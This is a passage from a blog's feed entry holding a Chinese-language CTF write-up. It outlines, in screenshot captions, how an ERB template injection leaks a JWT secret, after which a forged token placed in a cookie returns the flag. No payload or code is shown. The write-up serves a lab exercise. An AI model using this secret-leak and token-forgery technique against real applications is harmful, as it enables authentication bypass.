src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>返回的就是SECRET   </p><p>构造新的jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>写入cookie     </p><p>flag在返回头的cookie里    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;|_|-|&quot;&gt;&lt;/a&gt;|_|-|&lt;/h2&gt;&lt;p&gt;打开环境&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img13.360buyimg.com/ddimg/jfs/t1/17295</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/categories/CTF/jwt/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/tags/jwt/"/>
    
    <category term="ruby" scheme="http://lll-nnn.github.io/tags/ruby/"/>
    
    <category term="ERB" scheme="http://lll-nnn.github.io/tags/ERB/"/>
    
    <category term="SSTI" scheme="http://lll-nnn.github.io/tags/SSTI/"/>
    
  </entry>
  
</feed>
